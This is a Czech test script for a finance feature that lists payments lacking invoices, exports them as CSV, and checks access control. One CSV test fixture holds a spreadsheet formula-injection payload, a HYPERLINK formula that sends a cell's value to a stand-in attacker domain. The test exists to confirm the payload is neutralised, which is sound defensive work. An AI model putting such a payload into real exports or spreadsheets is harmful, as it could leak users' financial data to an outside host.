#!/usr/bin/env node
/**
 * Fronta Platby bez faktury — lib/finance-bez-faktury.ts (Finance Fáze 0,
 * krok 2: „dvě fronty v UI: Návrhy párování a Platby bez faktury — to
 * hledá účetní").
 *
 * Pusť `node --experimental-strip-types scripts/finance-bez-faktury.test.mjs`.
 *
 * Nejcennější kontroly: do fronty NEpatří platba zaplacená fakturou, Jinou
 * platbou, ruční úhradou, stornovaná ani ta, na kterou čeká návrh — jinak
 * by účetní honila doklady, které appka má. A CSV nesmí spustit vzorec.
 */

const { platbyBezFaktury, csvPlatebBezFaktury } = await import('../lib/finance-bez-faktury.ts')
const { readFileSync } = await import('node:fs')

let chyb = 0
const ok = (popis, podminka) => {
  if (!podminka) chyb++
  console.log(`  ${podminka ? 'OK   ' : 'CHYBA'} ${popis}`)
}
const zkus = (popis, fn) => {
  try { ok(popis, fn()) } catch (e) { ok(`${popis} — výjimka: ${e instanceof Error ? e.message : e}`, false) }
}
const cist = (cesta) => readFileSync(cesta, 'utf8').split('\r\n').join('\n')

const pohyb = (id, castka, jine = {}) => ({ id, datum: '2026-10-10', smer: 'vydaj', castkaHaleru: castka, mena: 'CZK', protistrana: 'Dodavatel', protiucet: '', vs: '', ucet: 'Běžný účet', stornovano: false, ...jine })
const prazdne = () => ({ sparovanoNaPohyb: new Map(), jinePlatbyNaPohyb: new Map(), rucneUhrazene: new Set(), sNavrhem: new Set() })
const ids = (radky) => radky.map((r) => r.id).join()

console.log('\n== Které platby jsou „bez faktury" ==')
{
  zkus('nespárovaná odchozí platba → ve frontě s celou částkou', () => {
    const r = platbyBezFaktury([pohyb('a', 1000)], prazdne())
    return r.length === 1 && r[0].id === 'a' && r[0].zbyvaHaleru === 1000
  })
  zkus('příjem → ne (fronta je pro odchozí platby)', () => platbyBezFaktury([pohyb('a', 1000, { smer: 'prijem' })], prazdne()).length === 0)
  zkus('stornovaná → ne', () => platbyBezFaktury([pohyb('a', 1000, { stornovano: true })], prazdne()).length === 0)
  zkus('celá spárovaná s fakturou → ne', () => {
    const s = prazdne(); s.sparovanoNaPohyb.set('a', 1000)
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0
  })
  zkus('spárovaná z části → ve frontě se zbytkem', () => {
    const s = prazdne(); s.sparovanoNaPohyb.set('a', 600)
    const r = platbyBezFaktury([pohyb('a', 1000)], s)
    return r.length === 1 && r[0].zbyvaHaleru === 400 && r[0].castkaHaleru === 1000
  })
  zkus('zaplacená Jinou platbou → ne', () => {
    const s = prazdne(); s.jinePlatbyNaPohyb.set('a', 1000)
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0
  })
  zkus('faktura + Jiná platba dohromady celá → ne; s haléřem navíc → zbytek 1', () => {
    const s = prazdne(); s.sparovanoNaPohyb.set('a', 700); s.jinePlatbyNaPohyb.set('a', 300)
    const s2 = prazdne(); s2.sparovanoNaPohyb.set('a', 700); s2.jinePlatbyNaPohyb.set('a', 299)
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0 && platbyBezFaktury([pohyb('a', 1000)], s2).map((r) => r.zbyvaHaleru).join() === '1'
  })
  zkus('ručně uhrazená faktura (platba v jiné měně) → ne', () => {
    const s = prazdne(); s.rucneUhrazene.add('a')
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0
  })
  zkus('čeká na ni návrh párování → ne (je ve frontě Návrhy)', () => {
    const s = prazdne(); s.sNavrhem.add('a')
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0
  })
  zkus('přeplacená párováním (zbytek záporný) → ne', () => {
    const s = prazdne(); s.sparovanoNaPohyb.set('a', 1200)
    return platbyBezFaktury([pohyb('a', 1000)], s).length === 0
  })
  zkus('souvislost jiného pohybu tenhle neschová', () => {
    const s = prazdne(); s.sparovanoNaPohyb.set('b', 1000); s.sNavrhem.add('c'); s.rucneUhrazene.add('d'); s.jinePlatbyNaPohyb.set('e', 1000)
    return ids(platbyBezFaktury([pohyb('a', 1000)], s)) === 'a'
  })
  zkus('řazení: nejnovější nahoře, při stejném dni podle id', () => {
    const r = platbyBezFaktury([pohyb('b', 1, { datum: '2026-10-01' }), pohyb('z', 1, { datum: '2026-10-05' }), pohyb('a', 1, { datum: '2026-10-05' })], prazdne())
    return ids(r) === 'a,z,b'
  })
}

console.log('\n== CSV pro účetní ==')
{
  const radky = platbyBezFaktury([
    pohyb('a', 123450, { datum: '2026-10-05', protistrana: 'Pekárna; Novák "a syn"', protiucet: '19-2000145399/0800', vs: '2026001', mena: null }),
    pohyb('b', 5, { datum: '2026-10-04', protistrana: '=HYPERLINK("https://zlo.example/?"&A2;"Doklad")', mena: 'eur', ucet: '+420 účet' }),
  ], prazdne())
  const csv = csvPlatebBezFaktury(radky)
  const radkyCsv = csv.slice(1).split('\r\n')
  ok('začíná BOM (Excel pozná UTF-8)', csv.charCodeAt(0) === 0xFEFF)
  ok('konce řádků CRLF, na konci jeden prázdný', csv.endsWith('\r\n') && radkyCsv.length === 4 && radkyCsv[3] === '' && !/[^\r]\n/.test(csv))
  ok(`hlavička — naměřeno: ${radkyCsv[0]}`, radkyCsv[0] === 'Datum;Částka;Bez faktury;Měna;Protistrana;Účet protistrany;VS;Platební účet')
  ok(`částka s čárkou a dvěma místy, prázdná měna = CZK, středník v textu v uvozovkách — naměřeno: ${radkyCsv[1]}`,
    radkyCsv[1] === '2026-10-05;1234,50;1234,50;CZK;"Pekárna; Novák ""a syn""";19-2000145399/0800;2026001;Běžný účet')
  ok(`vzorec v protistraně i v názvu účtu dostane apostrof, měna velkými — naměřeno: ${radkyCsv[2]}`,
    radkyCsv[2].startsWith('2026-10-04;0,05;0,05;EUR;') && radkyCsv[2].includes(`"'=HYPERLINK(`) && radkyCsv[2].endsWith(";'+420 účet"))
  ok('žádná buňka nezačíná =, +, - ani @ bez apostrofu',
    radkyCsv.slice(1, 3).every((r) => !/(^|;)"?[=+@-]/.test(r)))
}

console.log('\n== Stránka a export: přístup a načtení ==')
{
  const stranka = cist('app/[rozsah]/finance/platby/bez-faktury/page.tsx')
  const prvni = stranka.indexOf('export default async function')
  const telo = stranka.slice(prvni)
  ok('stránka: první v těle kontrola finance.read (zkusPristupFinanci), před načtením plateb',
    prvni > 0 && /zkusPristupFinanci\([^)]*'finance\.read'/.test(telo) && telo.indexOf('zkusPristupFinanci(') < telo.indexOf('nactiPlatbyBezFaktury('))
  ok('stránka: na pobočce fronta není (jen za firmu), před načtením plateb',
    telo.indexOf('if (pobockaFinanci(pristup.scope))') > 0 && telo.indexOf('if (pobockaFinanci(pristup.scope))') < telo.indexOf('nactiPlatbyBezFaktury('))
  const route = cist('app/api/ucetni/platby-bez-faktury/route.ts')
  const predNactenim = route.slice(0, route.indexOf('nactiPlatbyBezFaktury(await'))
  ok('export: před načtením kontrola finance.read, odmítnutí pobočky (403) a povinné období',
    /zkusPristup\(tenantId, 'finance\.read', rozsah\)/.test(predNactenim)
      && /if \(pristup\.stav === 'odepren'\) return new Response\([^)]*status: 403/.test(predNactenim)
      && /if \(pobockaFinanci\(pristup\.scope\)\) \{\s*return new Response\([^)]*status: 403/.test(predNactenim)
      && /!\/\^\\d\{4\}-\\d\{2\}-\\d\{2\}\$\/\.test\(od\)/.test(predNactenim))
  const nacteni = cist('lib/finance-bez-faktury-nacteni.ts')
  ok('načtení: pod přihlášeným (žádná služba)', /^import 'server-only'/.test(nacteni) && !/klientUlohy|service_role/.test(nacteni))
  ok('načtení: každý dotaz omezený na firmu (tenant_id)',
    (nacteni.match(/\.from\('/g) ?? []).length === (nacteni.match(/\.eq\('tenant_id', tenantId\)/g) ?? []).length)
  ok('načtení: chyba souvislosti → chyba stránky, ne „bez faktury"',
    /if \(parovani\.error \|\| jinePlatby\.error \|\| uhrady\.error \|\| storna\.error\)/.test(nacteni))
  ok('načtení: storno i stornovaný pohyb jsou stornované', /stornovano: r\.storno_of !== null \|\| stornovane\.has\(r\.id\)/.test(nacteni))
}

console.log(chyb === 0 ? '\nVŠECHNY KONTROLY PROŠLY\n' : `\n${chyb} KONTROL SPADLO\n`)
process.exit(chyb === 0 ? 0 : 1)
